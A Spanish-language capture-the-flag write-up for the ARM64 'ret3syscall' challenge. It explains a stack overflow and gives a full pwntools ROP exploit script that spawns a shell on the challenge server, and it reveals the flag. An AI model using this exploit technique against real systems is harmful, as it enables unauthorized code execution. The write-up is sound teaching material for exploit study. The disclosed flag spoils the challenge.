# Writeup: ret3syscall (YBN CTF)

**Categoría:** Pwn (ARM64 ROP)  
**Dificultad:** Media  
**Archivo:** `chal` (ARM aarch64, Statically Linked, Not Stripped)

## 1. Análisis Inicial

El reto nos proporciona un binario ARM64 (`chal`) y su código fuente (`chal.c`). Es un ejercicio guiado de **Return Oriented Programming (ROP)** en arquitectura ARM.

### Código Fuente (`chal.c`)
La función vulnerable es `buf()`:
```c
void buf(){
    char max[10];
    read(0, max, 0x300);
}
```
Tenemos un buffer de 10 bytes, pero leemos hasta 0x300 bytes (768 bytes). Esto es un **Stack Buffer Overflow** clásico.

El binario nos regala 4 gadgets específicos para construir nuestra cadena:
1.  **G1 (Write):** `str x0, [x1]; ... ret` (Escribir memoria).
2.  **G2 (Control):** `ldp x0, x1 ... br x16` (Controlar registros y saltar).
3.  **G3 (Syscall):** `mov x8, x6; svc #0` (Ejecutar syscall).
4.  **G4 (Clean):** `mov x2, #0; ... svc #0` (Limpiar x2).

## 2. Estrategia de Explotación

El objetivo es ejecutar `execve("/bin/sh", 0, 0)`.
Para ello necesitamos:
*   **x8 (Syscall Number):** 221 (`execve` en ARM64).
*   **x0 (filename):** Puntero a la cadena "/bin/sh".
*   **x1 (argv):** 0 (NULL).
*   **x2 (envp):** 0 (NULL).

### Obstáculos Encontrados

Durante el desarrollo del exploit, nos enfrentamos a varios problemas técnicos interesantes:

1.  **Bloqueo de `read`:**
    El programa usa `read(0, max, 0x300)`. Si enviamos un payload menor a 768 bytes y mantenemos el socket abierto, `read` se queda esperando más datos y nunca retorna.
    **Solución:** Rellenar (padding) el payload hasta alcanzar exactamente 0x300 bytes.

2.  **Offset del Return Address:**
    Calculamos que el offset para sobrescribir `x30` (Return Address en ARM64) es **24 bytes**.
    Layout: `Buffer (10) + Padding (6) + Saved x29 (8) = 24`.

3.  **Alineación del Stack (El "Magic Pad"):**
    Al saltar al primer gadget (`G2`), el programa crasheaba (EOF).
    El gadget `G2` empieza con `ldp x0, x1, [sp, #0x20]`. En ARM64, el Stack Pointer (`sp`) debe estar alineado a 16 bytes para usar instrucciones de carga vectorial (`ldp`).
    Nuestro overflow dejaba el `sp` desalineado respecto a la estructura esperada por `G2`.
    **Solución:** Mediante fuzzing, descubrimos que necesitábamos insertar **16 bytes de padding** justo después de sobrescribir el Return Address y antes de empezar la cadena ROP real.

4.  **Registro `x2` Sucio:**
    Al principio intentamos solo G2 -> G1 -> G2 -> G3. Pero fallaba.
    La razón es que `x2` (envp) contenía `0x300` (el tamaño del read anterior). `execve` fallaba con `EFAULT` al tratar `0x300` como un puntero a variables de entorno.
    **Solución:** Usar el gadget **G4** (`mov x2, #0`) para limpiar el registro antes de la syscall.

5.  **Tamaño del Payload:**
    La cadena completa (Write -> Clean -> Execve) con el padding necesario para `G2` (que suma 0xe0 bytes al sp en cada salto) excedía los 0x300 bytes disponibles.
    **Solución:** Optimizar la última cadena (la que llama a `execve`). Como no necesitamos retornar de ella, no hace falta enviar los 224 bytes completos de relleno de `G2`, solo lo suficiente para cargar los registros (aprox 64 bytes).

## 3. La Cadena ROP (The Chain)

El flujo de ejecución final es:

1.  **G2 (Setup)**: Carga registros para saltar a G1.
2.  **G1 (Write)**: Escribe `"/bin/sh\x00"` en la sección `.bss` (dirección fija y escribible).
3.  **G2 (Setup)**: Recarga registros para saltar a G4.
4.  **G4 (Clean)**: Pone `x2 = 0`. Ejecuta una syscall inofensiva y retorna.
5.  **G2 (Setup)**: Carga argumentos finales (`x0=.bss`, `x1=0`, `w6=221`) y salta a G3.
6.  **G3 (Execve)**: Ejecuta `syscall`. Shell obtenida.

## 4. Script de Explotación (`exploit.py`)

```python
from pwn import *
import time

# Configuración
context.arch = 'aarch64'
context.log_level = 'info'

HOST = 'tcp.ybn.sg'
PORT = 19229

# Direcciones (Gadgets & Memoria)
G1_WRITE   = 0x427094 # str x0, [x1]; ... ret
G2_CONTROL = 0x430418 # ldp x0, x1 ... br x16
G3_SYSCALL = 0x442990 # mov x8, x6; svc #0; ret
G4_CLEAN   = 0x41112c # mov x2, #0 ... svc #0 ... ret

ADDR_BSS = 0x4b1950   # Sección escribible para guardar "/bin/sh"
BIN_SH   = b"/bin/sh\x00"

def get_payload():
    # 1. Padding inicial hasta el Return Address (Offset 24)
    payload = b'A' * 24
    payload += p64(G2_CONTROL) # Sobrescribimos x30 (Ret Addr)
    
    # 2. Alineación de Stack (Crucial para G2)
    payload += b'P' * 16
    
    # --- CHAIN 1: Escribir "/bin/sh" en .bss ---
    # Usamos G2 para configurar los registros para G1.
    # G2 hace: ldp x0, x1, [sp, 0x20] ... br x16
    chain1 = flat({
        0x04: p32(0),           # w7 (basura)
        0x08: p64(G1_WRITE),    # x16 -> Saltar a G1
        0x20: [BIN_SH, ADDR_BSS], # x0="/bin/sh", x1=ADDR_BSS
        0x38: p32(0)            # w6 (basura)
    }, length=0xe0, filler=b'A') # G2 suma 0xe0 al SP
    payload += chain1
    
    # Retorno de G1: G1 consume 0x40 bytes de stack y retorna.
    # Necesitamos que retorne a G2 para continuar la cadena.
    chain1_ret = flat({
        0x00: b'B'*8,           # x29 (basura)
        0x08: p64(G2_CONTROL),  # x30 -> Volver a G2
    }, length=0x40, filler=b'C')
    payload += chain1_ret
    
    # --- CHAIN 2: Limpiar x2 (envp) ---
    # Usamos G2 para saltar a G4.
    chain2 = flat({
        0x04: p32(0),
        0x08: p64(G4_CLEAN),    # x16 -> Saltar a G4
        0x20: [0, 0],           # x0, x1 (no importan)
        0x38: p32(0)
    }, length=0xe0, filler=b'D')
    payload += chain2
    
    # Retorno de G4: G4 consume 0x20 bytes.
    chain2_ret = flat({
        0x00: b'E'*8,           # x29
        0x08: p64(G2_CONTROL),  # x30 -> Volver a G2
    }, length=0x20, filler=b'F')
    payload += chain2_ret
    
    # --- CHAIN 3: Syscall Execve ---
    # Usamos G2 para saltar a G3 con los argumentos correctos.
    # x0 = puntero a "/bin/sh", x1 = 0, x2 = 0 (ya limpio), w6 = 221 (syscall)
    chain3 = flat({
        0x04: p32(0),
        0x08: p64(G3_SYSCALL),  # x16 -> Saltar a G3
        0x20: [ADDR_BSS, 0],    # x0=ADDR_BSS, x1=0
        0x38: p32(221)          # w6=221 (execve)
    }, filler=b'G') # NO forzamos length=0xe0 para ahorrar espacio
    payload += chain3
    
    # Relleno final para desbloquear read()
    if len(payload) < 0x300:
        payload += b'X' * (0x300 - len(payload))
        
    return payload

def exploit():
    r = remote(HOST, PORT)
    
    # Consumir banner
    r.recvuntil(b"Good luck!\n")
    
    log.info("Enviando payload...")
    r.send(payload := get_payload())
    
    time.sleep(1)
    # Limpiar buffer de entrada
    try: r.recv(timeout=0.1)
    except: pass
    
    log.info("Exploit enviado. Obteniendo flag...")
    r.sendline(b"cat flag.txt")
    
    print(f"\nFLAG: {r.recv(timeout=2).decode().strip()}\n")
    r.close()

if __name__ == "__main__":
    exploit()
```

## Flag
`YBN25{one_small_step_for_man_one_giant_leap_for_mankind_123942}`
